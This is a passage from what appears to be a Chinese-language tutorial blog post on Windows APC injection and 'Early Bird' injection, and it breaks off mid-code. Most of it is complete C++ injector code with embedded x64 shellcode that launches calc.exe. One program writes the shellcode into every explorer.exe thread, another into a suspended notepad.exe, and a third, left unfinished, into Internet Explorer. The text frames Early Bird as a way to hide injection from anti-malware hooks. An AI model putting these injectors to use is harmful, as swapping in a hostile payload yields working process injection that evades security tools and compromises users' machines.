<h5 id="MsgWaitForMultipleObjects"><a href="#MsgWaitForMultipleObjects" class="headerlink" title="MsgWaitForMultipleObjects"></a>MsgWaitForMultipleObjects</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">VOID <span class="title function_">AlertableFunction4</span><span class="params">()</span> &#123;</span><br><span class="line"> HANDLE hEvent = CreateEvent(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"> <span class="keyword">if</span> (hEvent) &#123;</span><br><span class="line"> MsgWaitForMultipleObjects(<span class="number">1</span>, &amp;hEvent, TRUE, INFINITE, QS_INPUT);</span><br><span class="line"> CloseHandle(hEvent);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="SignalObjectAndWait"><a href="#SignalObjectAndWait" class="headerlink" title="SignalObjectAndWait"></a>SignalObjectAndWait</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">VOID <span class="title function_">AlertableFunction5</span><span class="params">()</span> &#123;</span><br><span class="line"> HANDLE hEvent1 = CreateEvent(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"> HANDLE hEvent2 = CreateEvent(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"> <span class="keyword">if</span> (hEvent1 &amp;&amp; hEvent2) &#123;</span><br><span class="line"> SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);</span><br><span class="line"> CloseHandle(hEvent1);</span><br><span class="line"> CloseHandle(hEvent2);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="暂停线程"><a href="#暂停线程" class="headerlink" title="暂停线程"></a>暂停线程</h3><p><code>QueueUserAPC</code> 函数可以在目标线程处于挂起状态时成功使用。如果使用这种方法来执行有效载荷，应首先调用 <code>QueueUserAPC</code>，然后再恢复挂起的线程。需要注意的是，线程必须在挂起状态下创建，挂起现有线程将不起作用。</p>
<h3 id="如何实现APC注入"><a href="#如何实现APC注入" class="headerlink" title="如何实现APC注入"></a>如何实现APC注入</h3><h4 id="获取Explorer进程下的每个线程-将shellcode通过APC注入到每个线程中"><a href="#获取Explorer进程下的每个线程-将shellcode通过APC注入到每个线程中" class="headerlink" title="获取Explorer进程下的每个线程,将shellcode通过APC注入到每个线程中"></a>获取Explorer进程下的每个线程,将shellcode通过APC注入到每个线程中</h4><ol>
<li><strong>创建快照</strong>: 使用 <code>CreateToolhelp32Snapshot</code> 获取系统中所有进程和线程的快照。</li>
<li><strong>查找目标进程</strong>: 枚举进程，查找名为 <code>explorer.exe</code> 的进程。</li>
<li><strong>打开目标进程</strong>: 使用 <code>OpenProcess</code> 获取目标进程的句柄，以便后续操作。</li>
<li><strong>分配内存</strong>: 在目标进程中分配一块可执行和可写的内存，用于存储 shellcode。</li>
<li><strong>写入内存</strong>: 使用 <code>WriteProcessMemory</code> 将 shellcode 写入目标进程的分配内存中。</li>
<li><strong>枚举目标线程</strong>: 枚举所有线程，查找属于目标进程的线程，并记录线程 ID。</li>
<li><strong>注入 APC</strong>: 对每个目标进程线程，使用 <code>QueueUserAPC</code> 将 shellcode 的地址作为 APC 函数队列到线程中。APC 会在线程进入警报式等待状态时执行。</li>
<li><strong>清理资源</strong>: 关闭目标进程和快照的句柄。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  <span class="comment">// 用于 printf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span> <span class="comment">// 用于 malloc 和 free</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个系统快照，捕获所有进程和线程。</span></span><br><span class="line">    HANDLE snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">    HANDLE victimProcess = <span class="literal">NULL</span>; <span class="comment">// 用于存储目标进程的句柄</span></span><br><span class="line">    PROCESSENTRY32 processEntry = &#123; <span class="built_in">sizeof</span>(PROCESSENTRY32) &#125;; <span class="comment">// 初始化进程条目结构</span></span><br><span class="line">    THREADENTRY32 threadEntry = &#123; <span class="built_in">sizeof</span>(THREADENTRY32) &#125;; <span class="comment">// 初始化线程条目结构</span></span><br><span class="line">    DWORD* threadIds = <span class="literal">NULL</span>; <span class="comment">// 指向动态分配的线程 ID 数组</span></span><br><span class="line">    <span class="type">size_t</span> threadCount = <span class="number">0</span>;  <span class="comment">// 记录找到的目标进程线程数量</span></span><br><span class="line"></span><br><span class="line">    SIZE_T shellSize = <span class="built_in">sizeof</span>(buf); <span class="comment">// 假设 buf 已经被定义为你的 shellcode</span></span><br><span class="line">    HANDLE threadHandle = <span class="literal">NULL</span>; <span class="comment">// 用于存储线程句柄</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 枚举系统中的所有进程，查找 explorer.exe</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;processEntry)) &#123;</span><br><span class="line">        <span class="keyword">while</span> (_wcsicmp(processEntry.szExeFile, <span class="string">L&quot;explorer.exe&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">Process32Next</span>(snapshot, &amp;processEntry)) &#123;</span><br><span class="line">                <span class="comment">// 如果找不到 explorer.exe 进程，输出错误信息并退出</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;无法找到目标进程。\n&quot;</span>);</span><br><span class="line">                <span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开目标进程（explorer.exe），获取其句柄以进行后续操作</span></span><br><span class="line">    victimProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, processEntry.th32ProcessID);</span><br><span class="line">    <span class="keyword">if</span> (!victimProcess) &#123;</span><br><span class="line">        <span class="comment">// 如果无法打开目标进程，输出错误信息并退出</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法打开目标进程。\n&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在目标进程中分配内存用于存储 shellcode</span></span><br><span class="line">    LPVOID shellAddress = <span class="built_in">VirtualAllocEx</span>(victimProcess, <span class="literal">NULL</span>, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!shellAddress) &#123;</span><br><span class="line">        <span class="comment">// 如果内存分配失败，输出错误信息并退出</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法分配内存。\n&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(victimProcess);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 shellcode 写入目标进程的内存</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(victimProcess, shellAddress, buf, shellSize, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="comment">// 如果写入失败，输出错误信息并释放分配的内存</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;写入内存失败。\n&quot;</span>);</span><br><span class="line">        <span class="built_in">VirtualFreeEx</span>(victimProcess, shellAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(victimProcess);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将分配的内存地址作为 APC 例程</span></span><br><span class="line">    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 枚举系统中的所有线程，寻找属于目标进程的线程</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Thread32First</span>(snapshot, &amp;threadEntry)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) &#123;</span><br><span class="line">                <span class="comment">// 重新分配内存以存储更多的线程 ID</span></span><br><span class="line">                DWORD* temp = (DWORD*)<span class="built_in">realloc</span>(threadIds, (threadCount + <span class="number">1</span>) * <span class="built_in">sizeof</span>(DWORD));</span><br><span class="line">                <span class="keyword">if</span> (!temp) &#123;</span><br><span class="line">                    <span class="comment">// 如果内存分配失败，输出错误信息并退出</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;内存分配失败。\n&quot;</span>);</span><br><span class="line">                    <span class="built_in">free</span>(threadIds);</span><br><span class="line">                    <span class="built_in">VirtualFreeEx</span>(victimProcess, shellAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">                    <span class="built_in">CloseHandle</span>(victimProcess);</span><br><span class="line">                    <span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                threadIds = temp; <span class="comment">// 更新线程 ID 数组指针</span></span><br><span class="line">                threadIds[threadCount++] = threadEntry.th32ThreadID; <span class="comment">// 将线程 ID 添加到数组</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(snapshot, &amp;threadEntry));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对目标进程中的每个线程，队列一个用户 APC 调用，以执行 shellcode</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; threadCount; ++i) &#123;</span><br><span class="line">        <span class="comment">// 打开线程以进行 APC 调用</span></span><br><span class="line">        threadHandle = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, TRUE, threadIds[i]);</span><br><span class="line">        <span class="keyword">if</span> (threadHandle) &#123;</span><br><span class="line">            <span class="comment">// 将 APC 添加到线程的 APC 队列中</span></span><br><span class="line">            <span class="built_in">QueueUserAPC</span>((PAPCFUNC)apcRoutine, threadHandle, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">1000</span> * <span class="number">2</span>); <span class="comment">// 等待 APC 有机会执行</span></span><br><span class="line">            <span class="built_in">CloseHandle</span>(threadHandle); <span class="comment">// 关闭线程句柄</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放动态分配的线程 ID 数组内存</span></span><br><span class="line">    <span class="built_in">free</span>(threadIds);</span><br><span class="line">    <span class="comment">// 关闭打开的进程和快照句柄</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(victimProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="拉起notepad-然后通过APC注入将shellcode注入到notepad线程中"><a href="#拉起notepad-然后通过APC注入将shellcode注入到notepad线程中" class="headerlink" title="拉起notepad,然后通过APC注入将shellcode注入到notepad线程中"></a>拉起notepad,然后通过APC注入将shellcode注入到notepad线程中</h4><ol>
<li><strong>创建进程</strong>: 使用 <code>CreateProcessA</code> 启动一个新的应用程序实例（记事本），并将其置于挂起状态以便可以在执行之前修改其内存。</li>
<li><strong>内存分配</strong>: 使用 <code>VirtualAllocEx</code> 在目标进程中分配一块内存区域，这块区域被标记为可执行和可写，以便能够存储和执行 shellcode。</li>
<li><strong>写入内存</strong>: <code>WriteProcessMemory</code> 将 shellcode 写入目标进程的内存空间中，以便后续可以通过 APC 调用执行。</li>
<li><strong>APC 注入</strong>: 使用 <code>QueueUserAPC</code> 将 shellcode 的地址作为一个 APC（异步过程调用）例程添加到进程的主线程中。当线程进入警报式等待状态时，APC 将被执行。</li>
<li><strong>恢复线程</strong>: <code>ResumeThread</code> 恢复挂起的线程状态，使其继续执行。由于 APC 已经被队列化，当线程恢复运行时，APC 将被调用执行。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 定义目标应用程序的路径，这里是记事本的可执行文件路径</span></span><br><span class="line">    LPCSTR lpApplication = <span class="string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义包含 shellcode 的缓冲区</span></span><br><span class="line">    <span class="comment">// 请注意，这里的 shellcode 是一段二进制数据，通常用于执行特定任务</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    SIZE_T buff = <span class="built_in">sizeof</span>(buf); <span class="comment">// 获取 shellcode 的大小</span></span><br><span class="line">    STARTUPINFOA sInfo = &#123; <span class="number">0</span> &#125;; <span class="comment">// 初始化 STARTUPINFOA 结构体，用于启动新进程</span></span><br><span class="line">    PROCESS_INFORMATION pInfo = &#123; <span class="number">0</span> &#125;; <span class="comment">// 初始化 PROCESS_INFORMATION 结构体，用于接收新建进程的信息</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个新的进程，启动记事本程序，并使其处于挂起状态</span></span><br><span class="line">    <span class="built_in">CreateProcessA</span>(lpApplication, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;sInfo, &amp;pInfo);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取新建进程的句柄和主线程的句柄</span></span><br><span class="line">    HANDLE hProc = pInfo.hProcess;</span><br><span class="line">    HANDLE hThread = pInfo.hThread;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在目标进程中分配内存，用于存储 shellcode</span></span><br><span class="line">    LPVOID lpvShellAddress = <span class="built_in">VirtualAllocEx</span>(hProc, <span class="literal">NULL</span>, buff, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将分配的内存地址转换为线程启动例程指针</span></span><br><span class="line">    PTHREAD_START_ROUTINE ptApcRoutine = (PTHREAD_START_ROUTINE)lpvShellAddress;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 shellcode 写入目标进程的分配内存中</span></span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProc, lpvShellAddress, buf, buff, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 shellcode 的地址作为 APC 函数队列到挂起的线程中</span></span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)ptApcRoutine, hThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复挂起的线程，开始执行（包括队列的 APC 函数）</span></span><br><span class="line">    <span class="built_in">ResumeThread</span>(hThread);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 程序结束，返回 0 表示成功执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="高级APC注入-Early-Bird注入"><a href="#高级APC注入-Early-Bird注入" class="headerlink" title="高级APC注入-Early Bird注入"></a>高级APC注入-Early Bird注入</h2><h3 id="什么是Early-Bird注入"><a href="#什么是Early-Bird注入" class="headerlink" title="什么是Early Bird注入?"></a>什么是Early Bird注入?</h3><blockquote>
<p>Early Bird本质上是一种APC注入与线程劫持的变体</p>
<p><strong>Early Bird注入通常指的是在目标进程的main函数之前执行注入</strong>这样做可以确保shellcode在程序开始执行之前被执行,从而隐藏注入行为.</p>
<p>原因在用于线程初始化时会调用ntdll未导出函数NtTestAlert,该函数会清空并处理APC队列,所以注入的代码通常在进程的主线程的入口点之前运行并接管进程控制权.从而避免了反恶意软件产品的钩子的检测,同时获得一个合法进程的环境信息.</p>
</blockquote>
<h3 id="新建一个进程-在进程的主线程初始化前进行APC注入"><a href="#新建一个进程-在进程的主线程初始化前进行APC注入" class="headerlink" title="新建一个进程,在进程的主线程初始化前进行APC注入"></a>新建一个进程,在进程的主线程初始化前进行APC注入</h3> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">  <span class="comment">// 初始化一个 STARTUPINFO 结构体，用于控制新进程主窗口的外观和行为。</span></span><br><span class="line">  STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  <span class="comment">// 初始化一个 PROCESS_INFORMATION 结构体，用于接收关于新创建的进程和线程的信息。</span></span><br><span class="line">  PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  <span class="comment">// 设置 STARTUPINFO 结构体的 cb 字段为其大小，这是必需的初始化步骤。</span></span><br><span class="line">  si.cb = <span class="built_in">sizeof</span>(STARTUPINFO);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用 CreateProcessA 函数创建一个新的进程，运行 Internet Explorer。</span></span><br><span class="line">  <span class="comment">// 参数包括程序路径，命令行参数（NULL 表示没有），安全属性（NULL 表示默认），</span></span><br><span class="line">  <span class="comment">// 子进程句柄继承（TRUE 表示允许），创建标志（CREATE_SUSPENDED 表示创建后初始挂起，CREATE_NO_WINDOW 表示不创建窗口），</span></span><br><span class="line">  <span class="comment">// 环境变量（NULL 表示使用父进程的环境），工作目录（NULL 表示使用父进程的工作目录），</span></span><br><span class="line">  <span class="comment">// STARTUPINFO 指针（提供进程启动设置），PROCESS_INFORMATION 指针（用于接收进程信息）。</span></span><br><span class="line">  <span class="built_in">CreateProcessA</span>(<span class="string">&quot;C:\\Program Files\\internet explorer\\iexplore.exe&quot;</span>, 